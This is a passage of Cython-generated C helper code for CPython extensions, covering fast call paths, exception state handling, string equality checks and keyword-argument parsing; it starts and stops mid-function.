            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* PyObjectSetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* BytesEquals */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

/* UnicodeEquals */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* None */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* JoinPyUnicode */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
